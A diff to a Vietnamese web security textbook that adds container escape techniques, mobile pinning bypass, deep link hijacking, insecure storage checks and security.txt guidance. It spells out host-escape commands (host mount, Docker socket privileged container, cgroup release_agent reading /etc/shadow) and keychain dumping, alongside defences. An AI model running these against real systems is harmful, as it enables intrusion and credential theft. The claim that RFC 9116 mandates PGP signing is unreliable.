@@ -5882,8 +5882,7 @@ CVE-2022-22963 (Spring Cloud Function):
 CVE-2022-22965 (Spring4Shell):
   → Xem Chương 43.5 cho chi tiết đầy đủ
 
-SpEL (Spring Expression Language — ngôn ngữ biểu thức built-in của Spring Framework,
-dùng để access Java objects tại runtime) syntax:
+SpEL syntax:
   #{expression}  — trong Spring XML configs
   ${expression}  — trong @Value annotations
   T(class)       — access static methods
@@ -15555,6 +15554,60 @@ http://etcd:2379/v2/keys/  ← cluster secrets
 # Service discovery qua DNS:
   *.svc.cluster.local → internal services
   SSRF tới http://service-name.namespace.svc.cluster.local
+```
+
+#### Container Escape — Từ Container Ra Host
+
+> **Hình dung:** Container giống phòng giam — ứng dụng bị nhốt bên trong, chỉ thấy filesystem và network riêng. Container escape = vượt ngục — attacker thoát ra khỏi container và kiểm soát máy host chạy Docker/Kubernetes.
+
+```
+Tại sao quan trọng? Trong cloud-native apps, tất cả chạy trong containers.
+Nếu attacker RCE trong container (qua SQLi, SSTI, deserialization...),
+bước tiếp theo là ESCAPE ra host → kiểm soát TOÀN BỘ cluster.
+
+═══ Kỹ thuật Container Escape phổ biến ═══
+
+1. Privileged Container (--privileged flag):
+   # Container chạy với --privileged có TOÀN QUYỀN truy cập host devices
+   # Kiểm tra: cat /proc/1/status | grep -i cap → CapEff: 0000003fffffffff = privileged
+   mount /dev/sda1 /mnt    # Mount host filesystem
+   chroot /mnt             # Bạn đang ở host root!
+   # → Đọc /etc/shadow, cài backdoor, pivot sang containers khác
+
+2. Docker Socket Mount (-v /var/run/docker.sock):
+   # Nếu container mount Docker socket → container kiểm soát Docker daemon
+   # = Tạo container MỚI với host filesystem mounted
+   curl -s --unix-socket /var/run/docker.sock \
+     -X POST http://localhost/containers/create \
+     -H "Content-Type: application/json" \
+     -d '{"Image":"alpine","Cmd":["sh"],"Binds":["/:/host"],"Privileged":true}'
+   # → Container mới mount / (host root) vào /host → full access
+
+3. Kernel Exploit (CVE-2022-0185, CVE-2022-0847 Dirty Pipe):
+   # Container share kernel với host — exploit kernel vuln = escape
+   # Dirty Pipe: ghi đè file read-only qua pipe → overwrite /etc/passwd trên host
+   # CVE-2022-0185: heap overflow trong filesystem context → container escape
+
+4. cgroups v1 Release Agent (CVE-2022-0492):
+   # Mount cgroup, set release_agent tới host binary → execute khi cgroup rỗng
+   mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
+   echo 1 > /tmp/cgrp/x/notify_on_release
+   echo "#!/bin/sh" > /cmd && echo "cat /etc/shadow > /output" >> /cmd
+   host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
+   echo "$host_path/cmd" > /tmp/cgrp/release_agent
+
+5. /proc/sys Escape (SYS_PTRACE capability):
+   # Container có SYS_PTRACE → inject code vào host process
+   # Tìm host process visible từ container: ps aux (trong host PID namespace)
+
+═══ Detection & Prevention ═══
+- KHÔNG dùng --privileged trừ khi thật sự cần (99% cases không cần)
+- KHÔNG mount Docker socket vào container
+- Dùng seccomp profile, AppArmor/SELinux
+- Drop ALL capabilities, chỉ add những cái cần: --cap-drop ALL --cap-add NET_BIND_SERVICE
+- Dùng rootless containers (Podman mặc định rootless)
+- Update kernel thường xuyên (kernel exploit = game over)
+- Runtime security: Falco, Sysdig → detect suspicious syscalls trong container
 ```
 
 #### SSRF → Redis → RCE (Classic Chain)
@@ -27338,8 +27391,22 @@ X-Frame-Options            | DENY hoặc SAMEORIGIN                             
 Referrer-Policy            | strict-origin-when-cross-origin                        | Information leak
 Permissions-Policy         | camera=(), microphone=(), geolocation=()               | Feature abuse
 Cache-Control              | no-store, no-cache (cho trang nhạy cảm)                | Data leak
+Clear-Site-Data             | "cache","cookies","storage" (cho logout)               | Session fixation
 X-XSS-Protection           | 0 (TẮT ĐI -- nó có thể bị khai thác!)                 | --
 ```
+
+> **Clear-Site-Data là gì?** Khi user logout, bạn muốn XÓA SẠCH mọi trace trong browser — cookies, cache, localStorage. Thay vì tự viết code xóa từng thứ, header `Clear-Site-Data` báo browser "xóa HẾT cho tôi". Rất quan trọng cho logout security — nếu không xóa sạch, attacker chiếm được máy user có thể dùng lại session cũ.
+>
+> ```
+> # Trả về trong response của endpoint /logout:
+> Clear-Site-Data: "cache", "cookies", "storage"
+>   "cache"   → xóa browser cache (pages, images, scripts đã lưu)
+>   "cookies" → xóa TẤT CẢ cookies của origin (session cookie biến mất!)
+>   "storage" → xóa localStorage, sessionStorage, IndexedDB
+>   "*"       → xóa TẤT CẢ (cache + cookies + storage + executionContexts)
+> ```
+>
+> **Expect-CT (DEPRECATED):** Header này yêu cầu browser kiểm tra Certificate Transparency logs — nhưng kể từ 2021, TẤT CẢ browsers đã enforce CT mặc định, nên header này không còn cần thiết. Đừng thêm vào production mới.
 
 ### E.2 CSP Examples
 
@@ -29434,6 +29501,11 @@ amass enum -d target.com -active -o amass.txt
 # Certificate transparency
 curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
 
+# security.txt (RFC 9116) — thông tin responsible disclosure
+curl -s https://target.com/.well-known/security.txt
+# Nhiều tổ chức lớn công khai: contact email, PGP key, bug bounty URL, hiring page
+# → Cho biết target có bug bounty program không, scope, và cách report
+
 # DNS brute force
 puredns bruteforce wordlist.txt target.com -r resolvers.txt
 
@@ -29794,6 +29866,192 @@ API9:2023 — Improper Inventory Management
 
 API10:2023 — Unsafe Consumption of APIs
   = Trusting 3rd-party API responses without validation
+```
+
+---
+
+---
+
+## Chương 48: Mobile App Security — Khi Web Gặp Mobile
+
+> **Tại sao trong sách web security?** Hầu hết mobile apps hiện đại chỉ là "web client đóng gói" — chúng gọi REST APIs, dùng JWT/OAuth, và gặp ĐÚNG NHỮNG LỖ HỔNG web bạn đã học. Hiểu mobile-specific attacks giúp bạn test ĐẦY ĐỦ attack surface.
+
+### 48.1 Certificate Pinning Bypass
+
+```
+Certificate Pinning là gì?
+  Bình thường, app trust TẤT CẢ Certificate Authorities (CA) trong hệ thống.
+  Pinning = app CHỈ trust 1 certificate/public key CỤ THỂ cho server của nó.
+  → Ngăn MITM proxy (Burp Suite) intercept traffic.
+
+  Hình dung: Bình thường bạn tin BẤT KỲ nhân viên nào đeo bảng tên công ty.
+  Pinning = bạn CHỈ tin DUY NHẤT anh Tuấn bảo vệ — ai khác đeo bảng tên 
+  cũng không được vào.
+
+Tại sao cần bypass khi pentest?
+  Để intercept traffic giữa app và server bằng Burp/mitmproxy,
+  bạn PHẢI vượt qua certificate pinning — nếu không, app từ chối kết nối.
+
+═══ Kỹ thuật Bypass ═══
+
+1. Frida (dynamic instrumentation):
+   # Frida inject JavaScript vào process đang chạy, hook SSL functions
+   frida -U -f com.target.app -l ssl-pinning-bypass.js --no-pause
+   
+   # Script ssl-pinning-bypass.js hook các functions:
+   #   Android: TrustManagerImpl.checkServerTrusted() → return thành công
+   #   iOS: SecTrustEvaluate() → return kSuccess
+   #   OkHttp: CertificatePinner.check() → skip validation
+
+2. Objection (automation framework built on Frida):
+   objection -g com.target.app explore
+   # Trong objection console:
+   android sslpinning disable    # Android
+   ios sslpinning disable        # iOS
+
+3. Android-specific:
+   # Network Security Config (Android 7+):
+   # Nếu app dùng default config, thêm user CA vào trusted:
+   # res/xml/network_security_config.xml
+   <network-security-config>
+     <debug-overrides>
+       <trust-anchors>
+         <certificates src="user"/>  <!-- Trust user-installed CAs -->
+       </trust-anchors>
+     </debug-overrides>
+   </network-security-config>
+   # Repack APK: apktool d app.apk → edit → apktool b → sign → install
+
+4. iOS-specific:
+   # SSL Kill Switch 2 (jailbroken): tweak hook SecureTransport
+   # Hoặc dùng Frida script cho non-jailbroken devices
+
+Sau khi bypass pinning:
+  → Traffic app đi qua Burp Suite như web traffic bình thường
+  → Test SQLi, IDOR, broken auth, BOLA... ĐÚNG NHƯ web app!
+```
+
+### 48.2 Deep Link Hijacking
+
+```
+Deep Links là gì?
+  URL mở app thay vì browser: myapp://profile/123
+  Khi click link này, Android/iOS mở app "myapp" thay vì Safari/Chrome.
+  
+  Universal Links (iOS) / App Links (Android):
+  Dùng HTTPS URLs: https://example.com/profile/123
+  → OS kiểm tra file cấu hình trên server → mở app thay vì browser
+
+═══ Deep Link Hijacking Attack ═══
+
+Vấn đề: Custom URI schemes (myapp://) KHÔNG có verification!
+  → Bất kỳ app nào đều có thể ĐĂNG KÝ xử lý cùng scheme
+
+Attack flow:
+  1. Victim cài legitimate app: com.bank.app (đăng ký bankapp://)
+  2. Victim cài malicious app (cũng đăng ký bankapp://)
+  3. Khi click bankapp://transfer?to=xxx&amount=1000
+     → OS HỎI user chọn app (Android) hoặc dùng app CUỐI cùng cài (iOS cũ)
+     → Malicious app nhận parameters chứa sensitive data!
+
+Real-world impact:
+  - OAuth callback hijack: bankapp://oauth/callback?code=AUTH_CODE
+    → Malicious app ĐÁNH CẮP authorization code → account takeover!
+  - Password reset: bankapp://reset?token=RESET_TOKEN
+    → Steal reset token → đổi password nạn nhân
+
+═══ Prevention ═══
+
+1. Dùng Universal Links / App Links (HTTPS-based):
+   # iOS: apple-app-site-association file trên server
+   # Android: assetlinks.json trên .well-known/
+   # → OS VERIFY domain ownership trước khi route tới app
+   # → App khác KHÔNG THỂ claim domain của bạn
+
+2. Validate deep link parameters:
+   # KHÔNG trust data từ deep links — treat như user input
+   # KHÔNG truyền tokens/credentials qua deep links
+   
+3. App Links verification (Android):
+   # File .well-known/assetlinks.json trên server:
+   [{
+     "relation": ["delegate_permission/common.handle_all_urls"],
+     "target": {
+       "namespace": "android_app",
+       "package_name": "com.bank.app",
+       "sha256_cert_fingerprints": ["AB:CD:EF:..."]
+     }
+   }]
+```
+
+### 48.3 Insecure Local Storage trên Mobile
+
+```
+Sai lầm phổ biến: Lưu sensitive data KHÔNG mã hóa trên device
+
+Android:
+  SharedPreferences → file XML plaintext: /data/data/com.app/shared_prefs/
+    # Nếu device rooted → đọc được TẤT CẢ
+  SQLite databases → /data/data/com.app/databases/
+    # Thường chứa tokens, user data không mã hóa
+
+iOS:
+  NSUserDefaults → plist files plaintext
+  Keychain → MÃ HÓA, nhưng vẫn extract được trên jailbroken device
+  Core Data / SQLite → thường không mã hóa
+
+Kiểm tra khi pentest:
+  # Android (rooted):
+  adb shell
+  run-as com.target.app  # Hoặc su nếu rooted
+  cat shared_prefs/*.xml | grep -i "token\|password\|key\|secret"
+  sqlite3 databases/*.db ".dump" | grep -i "token\|session"
+  
+  # iOS (jailbroken):
+  # Dùng objection:
+  objection -g com.target.app explore
+  env                           # Xem app directories
+  ios plist cat Info.plist      # App info
+  ios keychain dump             # Dump keychain items
+
+Best practices:
+  Android: EncryptedSharedPreferences (Jetpack Security)
+  iOS: Keychain với kSecAttrAccessibleWhenUnlockedThisDeviceOnly
+  Cả hai: KHÔNG lưu passwords/tokens trong plaintext files
+```
+
+### 48.4 security.txt — Responsible Disclosure cho Defenders
+
+```
+security.txt (RFC 9116) là gì?
+  File đặt tại /.well-known/security.txt trên website,
+  cho security researchers biết CÁCH BÁO CÁO lỗ hổng.
+
+  Hình dung: Giống biển "Nếu phát hiện cháy, gọi số 114" trong tòa nhà.
+  Không có biển → người phát hiện không biết báo ai → nguy hiểm.
+
+Ví dụ file security.txt:
+  Contact: mailto:security@example.com
+  Contact: https://example.com/security/report
+  Encryption: https://example.com/.well-known/pgp-key.txt
+  Acknowledgments: https://example.com/hall-of-fame
+  Policy: https://example.com/security-policy
+  Preferred-Languages: en, vi
+  Expires: 2027-01-01T00:00:00.000Z
+  
+  # PHẢI sign bằng PGP (theo RFC 9116)
+  # PHẢI có Expires date
+
+Cho pentester/bug bounty hunter:
+  LUÔN check /.well-known/security.txt TRƯỚC KHI test!
+  → Biết scope, rules of engagement, và nơi report
+  → Tránh test ngoài scope → có thể bị legal action
+
+Cho developer/sysadmin:
+  LUÔN tạo security.txt cho website production!
+  → Giúp researchers report lỗ hổng đúng cách
+  → Giảm risk "full disclosure" công khai vì không tìm được cách report
+  → Google, GitHub, Facebook, Shopee... đều có security.txt
 ```
 
 ---
